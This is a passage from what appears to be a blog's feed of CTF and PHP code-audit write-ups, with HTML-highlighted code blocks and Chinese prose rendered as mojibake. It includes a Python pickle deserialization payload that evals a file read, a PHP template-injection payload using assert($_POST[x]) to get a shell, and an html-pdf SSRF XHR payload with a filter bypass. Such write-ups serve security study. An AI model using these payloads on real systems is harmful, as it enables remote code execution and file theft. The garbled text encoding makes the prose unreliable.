class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"><span class="meta">@tornado.web.authenticated</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">        p = pickle.loads(urllib.unquote(become))</span><br><span class="line">        <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>æ¼æ´äº§ç”Ÿçš„åŸå› åœ¨äºå…¶å¯ä»¥å°†è‡ªå®šä¹‰çš„ç±»è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚ååºåˆ—åŒ–åäº§ç”Ÿçš„å¯¹è±¡ä¼šåœ¨ç»“æŸæ—¶è§¦å‘<strong>reduce</strong>()å‡½æ•°ä»è€Œè§¦å‘æ¶æ„ä»£ç ã€‚<br>å…¶å®ååºåˆ—åŒ–æ¼æ´æ€è·¯éƒ½æ˜¯å·®ä¸å¤šçš„<br>å°±æ˜¯æ‰¾åˆ°åºåˆ—åŒ–çš„å‚æ•°ï¼Œçœ‹ä»–å¯ä¸å¯ä»¥ä¿®æ”¹ï¼Œå¯ä»¥ä¿®æ”¹å°±å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–æˆ–è€…å‘½ä»¤æ‰§è¡Œ<br>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹becomeè¿™ä¸ªå‚æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line">#python2</span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">       return (eval, (&quot;open(&#39;&#x2F;flag.txt&#39;,&#39;r&#39;).read()&quot;,))    #æ‰“å¼€è¯»å–flag.txtçš„å†…å®¹</span><br><span class="line"></span><br><span class="line">a &#x3D; pickle.dumps(payload())  #åºåˆ—åŒ–payload</span><br><span class="line">a &#x3D; urllib.quote(a)  #è¿›è¡Œurlç¼–ç </span><br><span class="line">print a</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line">#python3</span><br><span class="line">class exp(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval,(&quot;open(&#39;&#x2F;flag.txt&#39;).read()&quot;,))</span><br><span class="line"></span><br><span class="line">a&#x3D;exp()</span><br><span class="line">s&#x3D;pickle.dumps(a)</span><br><span class="line">print urllib.quote(s)</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><p><img src="/2021/09/21/buu/22/image-20210924205124943.png" alt="image-20210924205124943"></p><p>ä¼ å…¥becomeå‚æ•°å³å¯</p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpä»£ç å®¡è®¡(ä¸‰)</title>
      <link href="/2021/09/17/src/3/"/>
      <url>/2021/09/17/src/3/</url>
      
        <content type="html"><![CDATA[<p> è¿™æ¬¡è¯•ç€å°è¯•å®¡è®¡bluecmsæ¼æ´</p><p>å®‰è£…bluecmsçš„æ•™ç¨‹æ–‡ç« ï¼š</p><p><a href="https://blog.csdn.net/qq_41209264/article/details/106773255">æ¸—é€æµ‹è¯•â€”â€”bluecmså®‰è£…åŠseayä»£ç å®¡è®¡_fallingskies-CSDNåšå®¢</a></p><p><a href="https://www.cnblogs.com/wkzb/p/12732078.html">phpä»£ç å®¡è®¡]bluecms v1.6 sp1 - beiwo - åšå®¢å›­ (cnblogs.com)</a></p><p>é‡åˆ°çš„ä¸€ä¸ªå°å‘å°±æ˜¯è®¿é—®å®‰è£…é¡µé¢ä¸€ç›´ä¸ºç©ºç™½ï¼Œè¿˜å¥½è§£å†³å•¦</p><p>ä¸Šé¢çš„æ–‡ç« å·²ç»è®²è§£å¾—å¾ˆè¯¦ç»†äº†</p><p><img src="/2021/09/17/src/3/image-20210917202058053.png" alt="image-20210917202058053"></p><p>åˆ›å»ºæˆåŠŸå›¾å¦‚ä¸‹ï¼š</p><p><img src="/2021/09/17/src/3/image-20210917202743734.png" alt="image-20210917202743734"></p><p>è·Ÿç€å¤§ä½¬æ–‡ç« é˜…è¯»ï¼š</p><p>[<a href="https://www.cnblogs.com/wkzb/p/12732078.html">phpä»£ç å®¡è®¡]bluecms v1.6 sp1 - beiwo - åšå®¢å›­ (cnblogs.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¼æ´æŒ–æ˜æ¼”ç»ƒ(ä¸€)</title>
      <link href="/2021/09/17/src/2/"/>
      <url>/2021/09/17/src/2/</url>
      
        <content type="html"><![CDATA[<p>ä»¥ä¸‹å†…å®¹å…¨éƒ¨æ¥è‡ªäºï¼šå®‰æ’ä¿¡æ¯</p><p>å…³äºcmsçš„æºç </p><p><img src="/2021/09/17/src/2/image-20210917152538626.png" alt="image-20210917152538626"></p><p>gitee.comä¸Šå¯ä»¥æ‰¾åˆ°å¾ˆå¤šèµ„æº</p><p>åŒæ ·githubä¹Ÿæ˜¯ã€‚</p><p>ä¾‹å­ä¸€ï¼š</p><p><img src="/2021/09/17/src/2/image-20210917153534213.png" alt="image-20210917153534213"></p><p>è§‚å¯Ÿä»¥ä¸Šä»£ç ï¼Œå‘ç°è¯¥phpæ–‡ä»¶æ˜æ˜¾æ˜¯è¯¥CMSçš„æ¨¡æ¿æ¸²æŸ“æ ¸å¿ƒä»£ç </p><p>å…¶ä¸­ï¼Œå¯¹å¤–è°ƒç”¨paser_stringå‡½æ•°ï¼Œæ ¸å¿ƒå‡½æ•°è¿è¡Œâ€”â€”parse,å¯¹å„ç§æ ‡ç­¾è¿›è¡Œè§£æã€‚</p><p>æ‰€ä»¥è”æƒ³åˆ°æ¨¡æ¿æ¸²æŸ“å¸¸å­˜åœ¨çš„SSTIæ¼æ´</p><p><img src="/2021/09/17/src/2/image-20210917153916987.png" alt="image-20210917153916987"></p><p>çœ‹åˆ°åœ¨å¤„ç†æ ‡ç­¾æ—¶è¿ç”¨è¯¸å¤ševal()å‡½æ•°</p><p>æ‰€ä»¥æ¥ä¸‹æ¥æ€è·¯ä¸ºï¼š</p><p>æ ¹æ®eval()å‡½æ•°ï¼Œè¿½è¸ªæº¯æºï¼Œçœ‹æ˜¯å¦å­˜åœ¨å¯æ§å˜é‡ã€‚</p><p>psï¼šæ²¡æœ‰å®¡è®¡ç»éªŒçš„äººï¼Œå»ºè®®æŠŠå…³é”®å‡½æ•°æå–å‡ºæ¥åˆ°æœ¬åœ°çš„PHPç¯å¢ƒè¿›è¡Œdebugè°ƒè¯•</p><p>ä¸»è¦æƒ³æ³•å°±æ˜¯ä¼ é€’ä»€ä¹ˆæ ·çš„å‚æ•°å¯ä»¥åœ¨evalä¸­æ‰§è¡Œï¼Œå¹¶ä¸”ç¡®å®ševalä¸­æ‰§è¡Œçš„ä»£ç æ˜¯å“ªä¸€å—ï¼Œæ˜¯å¦å¯æ§ã€‚</p><p>å‡è®¾ä¼ é€’{if:123}456{endif}</p><p>æ ¹æ®é€»è¾‘æ¨æ•²ï¼Œæœ€åä»£ç å›è¿›å…¥åˆ°è¯¥åˆ†æ”¯ä¸­</p><p>å¹¶ä¸”$strlfçš„å€¼æ˜¯123</p><p><img src="/2021/09/17/src/2/image-20210917154659350.png" alt="image-20210917154659350"></p><p>æ‰€ä»¥æœ€åèƒ½å¤Ÿæ„æˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(123)&#123;isFlag&#x3D;true;&#125;else&#123;isFalse&#125;;</span><br></pre></td></tr></table></figure><p>æ¥ç€ï¼Œå°±æ˜¯æ³¨å…¥ä»£ç æ¥getshelläº†</p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:1&#125;assert($_POST[x];&#x2F;&#x2F;)123&#123;endif&#125;</span><br></pre></td></tr></table></figure><p>æ‹¼æ¥åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:1&#125;assert($_POST[x];&#x2F;&#x2F;)&#123;isFlag&#x3D;true;&#125;else&#123;isFalse&#125;;</span><br></pre></td></tr></table></figure><p>åˆ†æï¼š1ä¸ºæ°¸çœŸæ¡ä»¶ï¼Œ//å°†åé¢çš„æ³¨é‡Šäº†</p><p>æœ€åå°±æ‰§è¡Œäº†assert($_POST[x]);</p><p>æˆ‘ä»¬ç»§ç»­æ‰¾ä¼ é€’å‚æ•°çš„åœ°æ–¹</p><p>åå‘è¿½è¸ªï¼Œè°ƒç”¨labelif()å‡½æ•°çš„æ˜¯_parse(),è€Œ _parseåªè¢«parse_stringè°ƒç”¨</p><p><img src="/2021/09/17/src/2/image-20210917155446820.png" alt="image-20210917155446820"></p>]]></content>
      
      
      
        <tags>
            
            <tag> src </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP and MySQL Web Development(äºŒ)</title>
      <link href="/2021/09/15/php/3/"/>
      <url>/2021/09/15/php/3/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>runoob.com-html(1)</title>
      <link href="/2021/09/13/web/0/"/>
      <url>/2021/09/13/web/0/</url>
      
        <content type="html"><![CDATA[<p>1.HTMLæ–‡æ¡£çš„åç¼€å</p><p>.html                .htm</p><p>2.å®ä¾‹è§£æ</p><p><img src="/2021/09/13/web/0/02A7DD95-22B4-4FB9-B994-DDB5393F7F03.jpg"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt; å£°æ˜ä¸º HTML5 æ–‡æ¡£</span><br><span class="line">&lt;html&gt; å…ƒç´ æ˜¯ HTML é¡µé¢çš„æ ¹å…ƒç´ </span><br><span class="line">&lt;head&gt; å…ƒç´ åŒ…å«äº†æ–‡æ¡£çš„å…ƒï¼ˆmetaï¼‰æ•°æ®ï¼Œå¦‚ &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; å®šä¹‰ç½‘é¡µç¼–ç æ ¼å¼ä¸º utf-8ã€‚</span><br><span class="line">&lt;title&gt; å…ƒç´ æè¿°äº†æ–‡æ¡£çš„æ ‡é¢˜</span><br><span class="line">&lt;body&gt; å…ƒç´ åŒ…å«äº†å¯è§çš„é¡µé¢å†…å®¹</span><br><span class="line">&lt;h1&gt; å…ƒç´ å®šä¹‰ä¸€ä¸ªå¤§æ ‡é¢˜</span><br><span class="line">&lt;p&gt; å…ƒç´ å®šä¹‰ä¸€ä¸ªæ®µè½</span><br></pre></td></tr></table></figure><p>HTML æ˜¯ç”¨æ¥æè¿°ç½‘é¡µçš„ä¸€ç§è¯­è¨€ã€‚</p><p>HTML æŒ‡çš„æ˜¯è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€: <strong>H</strong>yper<strong>T</strong>ext <strong>M</strong>arkup <strong>L</strong>anguage</p><p>HTMLæ ‡ç­¾</p><p>HTMLå…ƒç´ </p><p>HTMLç½‘é¡µç»“æ„</p><p><img src="/2021/09/13/web/0/image-20210913221500807.png" alt="image-20210913221500807"></p><p>æ–‡æ¡£æ ¼å¼ä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;div&gt;åˆ†ç±»ç›®å½•...&lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div&gt;å½“å‰åˆ†ç±»å†…å®¹åˆ—è¡¨...&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt; </span><br></pre></td></tr></table></figure><p>å¸¸ç”¨æ ‡ç­¾ä»‹ç»ï¼š</p><p>æ–‡æœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æœ€å¸¸ç”¨ï¼š&lt;font&gt;,ç”¨äºæ”¹å˜å­—ä½“ï¼Œå­—å·æ–‡å­—é¢œè‰²</span><br></pre></td></tr></table></figure><p>å›¾ç‰‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;hr&gt;æ ‡ç­¾ç”¨äºåœ¨é¡µé¢ä¸Šæ·»åŠ å›¾ç‰‡ï¼Œsrcå±æ€§æŒ‡å®šå›¾ç‰‡çš„åœ°å€ï¼Œå¦‚æœæ— æ³•æ‰“å¼€srcæŒ‡å®šçš„å›¾ç‰‡ï¼Œæµè§ˆå™¨é€šå¸¸ä¼šåœ¨é¡µé¢ä¸Šéœ€è¦æ˜¾ç¤ºå›¾ç‰‡çš„åœ°æ–¹æ˜¾ç¤ºaltå±æ€§å®šä¹‰çš„æ–‡æœ¬ã€‚</span><br><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Icons&#x2F;valid-xhtml10&quot; alt&#x3D;&quot;å›¾ç‰‡ç®€ä»‹&quot; &#x2F;&gt; </span><br></pre></td></tr></table></figure><p>é“¾æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¶…çº§é“¾æ¥ç”¨&lt;a&gt;æ ‡ç­¾è¡¨ç¤ºï¼Œhrefå±æ€§æŒ‡å®šäº†é“¾æ¥åˆ°çš„åœ°å€ã€‚&lt;a&gt;æ ‡ç­¾å¯ä»¥åŒ…å«æ–‡æœ¬ï¼Œä¹Ÿå¯ä»¥åŒ…å«å›¾ç‰‡ã€‚</span><br><span class="line">&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.runoob.com&#x2F;&quot;&gt;èœé¸Ÿæ•™ç¨‹&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;validator.w3.org&quot;&gt;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Icons&#x2F;valid-xhtml10&quot; alt&#x3D;&quot;éªŒè¯HTML&quot; &#x2F;&gt;&lt;&#x2F;a&gt; </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021ç¥¥äº‘æ¯ secrets_of_admin&amp;crwaler_z</title>
      <link href="/2021/09/07/buu/21/"/>
      <url>/2021/09/07/buu/21/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/rfrder/article/details/119914746">ç¥¥äº‘æ¯2021 Webå¤ç°_fengçš„åšå®¢-CSDNåšå®¢</a></p><p>[ç¥¥äº‘æ¯2021 web wp | Z3ratu1â€™s blog](<a href="https://blog.z3ratu1.cn/%E7%A5%A5%E4%BA%91%E6%9D%AF2021">https://blog.z3ratu1.cn/ç¥¥äº‘æ¯2021</a> wp.html#more)</p><p><a href="https://cbatl.gitee.io/">ly0n - A hard-working boy (gitee.io)</a></p><p><a href="https://www.freebuf.com/articles/system/178150.html">Linuxä¸‹å‡ ç§åå¼¹Shellæ–¹æ³•çš„æ€»ç»“ä¸ç†è§£ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p><a href="https://www.wlhhlc.top/posts/20107/#cralwer-z">2021ç¥¥äº‘æ¯WEB-WP | dota_st (wlhhlc.top)</a></p><h4 id="secrets-of-admin"><a href="#secrets-of-admin" class="headerlink" title="secrets_of_admin"></a>secrets_of_admin</h4><p>æ‰“å¼€åé¡µé¢å¦‚ä¸‹ï¼š</p><p><img src="/2021/09/07/buu/21/image-20210908114725080.png" alt="image-20210908114725080"></p><p>database.jsé‡Œç›´æ¥ç»™å‡ºç”¨æˆ·åå’Œå¯†ç ï¼š</p><p>Usernameï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br></pre></td></tr></table></figure><p>Passwordï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645</span><br></pre></td></tr></table></figure><p>ç™»å½•åå°±æœ‰äº†ä¸Šä¼ ç•Œé¢</p><p><img src="/2021/09/07/buu/21/image-20210908114945704.png" alt="image-20210908114945704"></p><p>æç¤ºæˆ‘ä»¬ä¸Šä¼ pdfç±»å‹çš„æ–‡ä»¶ï¼Œåˆåªèƒ½postä¼ å‚</p><p>ä»¥ä¸‹ç›´<code>files</code>è¡¨å¯ä»¥çŸ¥é“ï¼Œflagåœ¨<code>superuser</code>é‚£é‡Œï¼Œä½†æ˜¯<code>superuser</code>ä¸èƒ½ç”¨ã€‚é€šè¿‡ä¸‹é¢ä¸‰è¡Œä»£ç ä¹Ÿå¯ä»¥çŸ¥é“ï¼Œéœ€è¦æŠŠ<code>flag</code>ç»™<code>admin</code>ç”¨æˆ·æ¥æ‘˜æŠ„wpï¼ˆå› ä¸ºæˆ‘æ²¡æºç ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let filename &#x3D; await DB.getFile(token.username, req.params.id)</span><br><span class="line">         if (fs.existsSync(path.join(__dirname , &quot;..&#x2F;files&#x2F;&quot;, filename)))&#123;</span><br><span class="line">             return res.send(await readFile(path.join(__dirname , &quot;..&#x2F;files&#x2F;&quot;, filename)));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯/api/files/åŠŸèƒ½é‚£é‡Œéœ€è¦SSRFã€‚</p><p>é€šè¿‡æŸ¥æ‰¾html-pdfåº“å‘ç°å®ƒå­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html-pdf before version 3.0.1 is vulnerable to Arbitrary File Read. The package fails to sanitize the HTML input, allowing attackers to exfiltrate server files by supplying malicious HTML code. XHR requests in the HTML code are executed by the server. Input with an XHR request such as request.open(&quot;GET&quot;,&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;) will result in a PDF document with the contents of &#x2F;etc&#x2F;passwd.</span><br></pre></td></tr></table></figure><p>å› æ­¤å¯ä»¥åˆ©ç”¨åˆ¶é€ pdfçš„åŠŸèƒ½æ¥å®ç°ssrfï¼ŒæŠŠflagç»™adminç”¨æˆ·ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://127.0.0.1:8888/api/files?username=admin&amp;filename=./flag&amp;checksum=1&quot;</span>, <span class="literal">true</span>);xhr.send();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>è€Œä¸”filenameå­—æ®µæ˜¯UNIQUEï¼Œéœ€è¦ä¸èƒ½ç›´æ¥flagï¼Œç”¨./flagã€‚</p><p>ä½†æ˜¯æœ‰ä¸ªé—®é¢˜å°±æ˜¯è¿™ä¸ªè¿‡æ»¤ï¼š</p><pre><code>if ( content == &#39;&#39; || content.includes(&#39;&lt;&#39;) || content.includes(&#39;&gt;&#39;) || content.includes(&#39;/&#39;) || content.includes(&#39;script&#39;) || content.includes(&#39;on&#39;))&#123;    // even admin can&#39;t be trusted right ? :)      return res.render(&#39;admin&#39;, &#123; error: &#39;Forbidden word ğŸ¤¬&#39;&#125;);&#125; else &#123;</code></pre><p>å½“æ—¶è‡ªå·±å°±å¡åœ¨äº†è¿™é‡Œï¼Œä¸çŸ¥é“æ€ä¹ˆç»•è¿‡ã€‚å…³é”®å°±åœ¨äºnode.jsçš„å¼±ç±»å‹å’Œphpçš„å¼±ç±»å‹æœ‰æ‰€ä¸åŒã€‚jsä¸­æ•°ç»„å’Œå­—ç¬¦ä¸²æ‹¼æ¥çš„è¯ï¼Œæ¯”å¦‚[â€œhelloâ€]+â€worldâ€ï¼Œå¾—åˆ°çš„æ˜¯helloworldï¼Œè€Œphpé‡Œç¡®å®Arrayworldã€‚ä¹Ÿæ˜¯å› ä¸ºæ·±å—phpçš„å½±å“ï¼Œæ‰€ä»¥æ²¡æƒ³åˆ°è¿™é‡Œå¯ä»¥ç”¨æ•°ç»„æ¥ç»•è¿‡ï¼Œè®°å¾—URLç¼–ç </p><p>ç„¶åæˆ‘æ˜¯ä¸¢è¿›bpé‡Œï¼Œåªéœ€è¦contentæ”¹æˆcontent[],ä¼ æ•°ç»„</p><p><img src="/2021/09/07/buu/21/image-20210908115802410.png" alt="image-20210908115802410"></p><p><img src="/2021/09/07/buu/21/image-20210908120122404.png" alt="image-20210908120122404"></p><p>å‡ºç°è¿™ä¸ªé¡µé¢å°±æ˜¯æˆåŠŸ</p><p><img src="/2021/09/07/buu/21/image-20210908120634020.png" alt="image-20210908120634020"></p><p>æ‰“å¼€åå°±æœ‰flag</p><p><img src="/2021/09/07/buu/21/image-20210908120715884.png" alt="image-20210908120715884"></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpä»£ç å®¡è®¡(ä¸‰)</title>
      <link href="/2021/09/05/php/2/"/>
      <url>/2021/09/05/php/2/</url>
      
        <content type="html"><![CDATA[<p> è¿™æ˜¯ä¸€æ¬¡å¯¹å•ç‹¬æ–‡ç« çš„åˆ†æ</p><p>æ¥è‡ªäºå®‰å…¨å®¢ï¼š</p><p><a href="https://www.anquanke.com/post/id/250537">ThinkPHP 3.2.3 æ¼æ´å¤ç° - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼æ¯ 2020 æ€»å†³èµ› Novel&amp;GameExp</title>
      <link href="/2021/09/04/buu/20/"/>
      <url>/2021/09/04/buu/20/</url>
      
        <content type="html"><![CDATA[<h4 id="Novel"><a href="#Novel" class="headerlink" title="Novel:"></a>Novel:</h4><p>å‚è€ƒåšå®¢ï¼š</p><p><a href="https://www.cnblogs.com/W4nder/p/14078695.html">ç½‘é¼æ¯2020çº¿ä¸‹web - W4nder - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://mount4in.github.io/2020/12/08/2020%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9BWeb%E9%A2%98%E7%9B%AEwriteup/">2020ç¬¬äºŒå±Šç½‘é¼æ¯åŠå†³èµ›Webé¢˜ç›®writeup | Mount4in</a></p><p>åœ¨buuä¸Šä¸‹è½½äº†æºæ–‡ä»¶</p><p><img src="/2021/09/04/buu/20/image-20210905094734716.png" alt="image-20210905094734716"></p><p>å…ˆçœ‹çœ‹index.php</p><p>æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">defined(&#39;DS&#39;) or define(&#39;DS&#39;, DIRECTORY_SEPARATOR);</span><br><span class="line">define(&#39;APP_DIR&#39;, realpath(&#39;.&#x2F;&#39;));</span><br><span class="line">error_reporting(0);</span><br><span class="line">function autoload_class($class)&#123;</span><br><span class="line">foreach(array(&#39;class&#39;) as $dir)&#123;</span><br><span class="line">$file &#x3D; APP_DIR.DS.$dir.DS.$class.&#39;.class.php&#39;;</span><br><span class="line">&#x2F;&#x2F; echo $file;</span><br><span class="line">if(file_exists($file))&#123;</span><br><span class="line">&#x2F;&#x2F; echo $file;</span><br><span class="line">include_once $file;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function upload($config)&#123;</span><br><span class="line">$upload_config[&#39;class&#39;]&#x3D;$config[&#39;class&#39;];</span><br><span class="line">foreach(array(&#39;file&#39;,&#39;method&#39;) as $param)&#123;</span><br><span class="line">$upload_config[&#39;data&#39;][$param]&#x3D;$config[$param];</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; var_dump($upload_config);</span><br><span class="line">return $upload_config;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function home($config)&#123;</span><br><span class="line">$home_config[&#39;class&#39;]&#x3D;$config[&#39;class&#39;];</span><br><span class="line">$home_config[&#39;data&#39;][&#39;method&#39;]&#x3D;$config[&#39;method&#39;];</span><br><span class="line">return $home_config;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function back($config)&#123;</span><br><span class="line">$copy_config[&#39;class&#39;]&#x3D;$config[&#39;class&#39;];</span><br><span class="line">$copy_config[&#39;data&#39;][&#39;method&#39;]&#x3D;$config[&#39;method&#39;];</span><br><span class="line">$copy_config[&#39;data&#39;][&#39;filename&#39;]&#x3D;$config[&#39;post&#39;][&#39;filename&#39;];</span><br><span class="line">$copy_config[&#39;data&#39;][&#39;dest&#39;]&#x3D;$config[&#39;post&#39;][&#39;dest&#39;];</span><br><span class="line">return $copy_config;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">spl_autoload_register(&#39;autoload_class&#39;);</span><br><span class="line"></span><br><span 